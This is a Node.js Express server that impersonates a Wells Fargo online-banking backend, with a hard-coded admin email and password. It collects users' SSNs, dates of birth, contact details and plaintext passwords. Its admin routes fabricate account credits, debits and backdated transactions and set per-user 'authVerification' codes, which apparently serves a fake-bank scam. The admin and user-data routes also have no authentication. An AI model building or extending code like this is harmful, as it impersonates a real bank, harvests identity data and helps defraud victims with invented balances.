const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();

// --- CONFIGURATION ---
const PORT = 7860; 

// --- MIDDLEWARE ---
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// --- FILE PATHS ---
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)){
    fs.mkdirSync(DATA_DIR);
}

const USERS_FILE = path.join(DATA_DIR, 'users.json');
const ACCOUNTS_FILE = path.join(DATA_DIR, 'accounts.json');
const TRANSACTIONS_FILE = path.join(DATA_DIR, 'transactions.json');

// --- HELPER FUNCTIONS ---
const readData = (filePath) => {
    try {
        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, '[]');
            return [];
        }
        const data = fs.readFileSync(filePath, 'utf8');
        return data ? JSON.parse(data) : [];
    } catch (err) { return []; }
};

const writeData = (filePath, data) => {
    try {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
        return true;
    } catch (err) { return false; }
};

// --- ROUTES ---

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 1. ADMIN LOGIN
app.post('/api/admin-login', (req, res) => {
    const { email, password } = req.body;
    if (email === "admin@wellsfargo.com" && password === "tqn8e5RLVVd2") {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

// 2. REGISTER
app.post('/api/register', (req, res) => {
    const { username, password, fullName, dob, ssn, email, phone } = req.body;
    let users = readData(USERS_FILE);
    let accounts = readData(ACCOUNTS_FILE);

    if (users.find(u => u.username === username || u.email === email)) {
        return res.status(400).json({ success: false, message: "User exists" });
    }

    const userId = 'USR' + Date.now();
    const newUser = {
        userId, username, password,
        firstName: fullName.split(' ')[0],
        lastName: fullName.split(' ').slice(1).join(' '),
        email, phone, dob, ssn,
        address: "Not set", // Default address
        joinDate: new Date().getFullYear().toString(), // Join Year
        status: 'successful',
        adminNote: '', authVerification: { enabled: false, authName: '', authCode: '' }
    };

    const newChecking = {
        accountId: 'CHK' + Math.floor(1000000000 + Math.random() * 9000000000),
        userId, accountName: 'EVERYDAY CHECKING',
        accountNumber: Math.floor(1000000000 + Math.random() * 9000000000).toString(),
        balance: 0.00, type: 'checking'
    };

    const newSavings = {
        accountId: 'SAV' + Math.floor(1000000000 + Math.random() * 9000000000),
        userId, accountName: 'WAY2SAVE® SAVINGS',
        accountNumber: Math.floor(1000000000 + Math.random() * 9000000000).toString(),
        balance: 0.00, type: 'savings'
    };

    users.push(newUser);
    accounts.push(newChecking, newSavings);
    writeData(USERS_FILE, users);
    writeData(ACCOUNTS_FILE, accounts);
    res.json({ success: true });
});

// 3. LOGIN
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    const users = readData(USERS_FILE);
    const user = users.find(u => u.username === username && u.password === password);

    if (user) {
        res.json({ success: true, userId: user.userId });
    } else {
        res.status(401).json({ success: false });
    }
});

// 4. GET USER DATA
app.get('/api/user-data', (req, res) => {
    const { userId } = req.query;
    const users = readData(USERS_FILE);
    const accounts = readData(ACCOUNTS_FILE);
    const user = users.find(u => u.userId === userId);
    
    if (!user) return res.status(404).json({ success: false });

    const userAccounts = accounts.filter(a => a.userId === userId);
    
    res.json({ 
        success: true, 
        user: { 
            firstName: user.firstName,
            lastName: user.lastName,
            email: user.email,
            username: user.username,
            phone: user.phone,
            address: user.address, // Sending address
            joinDate: user.joinDate,
            status: user.status,
            authVerification: user.authVerification 
        }, 
        accounts: userAccounts 
    });
});

// *** NEW: UPDATE ADDRESS ***
app.post('/api/update-address', (req, res) => {
    const { userId, address } = req.body;
    let users = readData(USERS_FILE);
    const userIndex = users.findIndex(u => u.userId === userId);

    if (userIndex === -1) return res.status(404).json({ success: false });

    users[userIndex].address = address;
    writeData(USERS_FILE, users);
    res.json({ success: true });
});

// 5. GET USER TRANSACTIONS
app.get('/api/user-transactions', (req, res) => {
    const { userId } = req.query;
    const transactions = readData(TRANSACTIONS_FILE);
    const userTxs = transactions
        .filter(t => t.userId === userId)
        .sort((a, b) => new Date(b.date) - new Date(a.date));
    res.json({ success: true, transactions: userTxs });
});

// *** NEW: PROCESS USER TRANSFER ***
app.post('/api/user-transfer', (req, res) => {
    const { userId, fromAccountNum, amount, description, type } = req.body;
    let accounts = readData(ACCOUNTS_FILE);
    let transactions = readData(TRANSACTIONS_FILE);

    const accountIndex = accounts.findIndex(a => a.accountNumber === fromAccountNum && a.userId === userId);
    if (accountIndex === -1) return res.status(404).json({ success: false, message: "Account not found" });

    const valAmount = parseFloat(amount);
    if (accounts[accountIndex].balance < valAmount) {
        return res.status(400).json({ success: false, message: "Insufficient funds" });
    }

    accounts[accountIndex].balance -= valAmount;

    const newTx = {
        txId: 'TX' + Date.now(),
        userId: userId,
        accountId: accounts[accountIndex].accountId,
        accountNumber: fromAccountNum,
        type: 'debit',
        amount: valAmount,
        description: description || `Transfer to ${type}`,
        date: new Date().toISOString(),
        status: 'completed'
    };

    transactions.push(newTx);
    writeData(ACCOUNTS_FILE, accounts);
    writeData(TRANSACTIONS_FILE, transactions);
    res.json({ success: true });
});

// 6. ADMIN ROUTES
app.get('/api/admin/data', (req, res) => {
    const users = readData(USERS_FILE);
    const accounts = readData(ACCOUNTS_FILE);
    const sanitizedUsers = users.map(u => { const { password, ...rest } = u; return rest; });
    res.json({ users: sanitizedUsers, accounts: accounts });
});

app.post('/api/admin/update-user', (req, res) => {
    const { userId, status, adminNote, authVerification } = req.body;
    let users = readData(USERS_FILE);
    const userIndex = users.findIndex(u => u.userId === userId);
    if (userIndex === -1) return res.status(404).json({ success: false });

    users[userIndex].status = status;
    users[userIndex].adminNote = adminNote;
    users[userIndex].authVerification = authVerification;
    writeData(USERS_FILE, users);
    res.json({ success: true });
});

app.post('/api/admin/transaction', (req, res) => {
    const { accountNumber, amount, description, type, merchant, date } = req.body;
    let accounts = readData(ACCOUNTS_FILE);
    let transactions = readData(TRANSACTIONS_FILE);

    const accountIndex = accounts.findIndex(a => a.accountNumber === accountNumber);
    if (accountIndex === -1) return res.status(404).json({ success: false, message: "Account not found" });

    const valAmount = parseFloat(amount);
    if (type === 'credit') accounts[accountIndex].balance += valAmount;
    else if (type === 'debit') accounts[accountIndex].balance -= valAmount;

    const newTx = {
        txId: 'TX' + Date.now(),
        userId: accounts[accountIndex].userId,
        accountId: accounts[accountIndex].accountId,
        accountNumber, type, amount: valAmount,
        description: description || merchant || 'Transaction',
        date: date || new Date().toISOString(),
        status: 'completed'
    };

    transactions.push(newTx);
    writeData(ACCOUNTS_FILE, accounts);
    writeData(TRANSACTIONS_FILE, transactions);
    res.json({ success: true });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
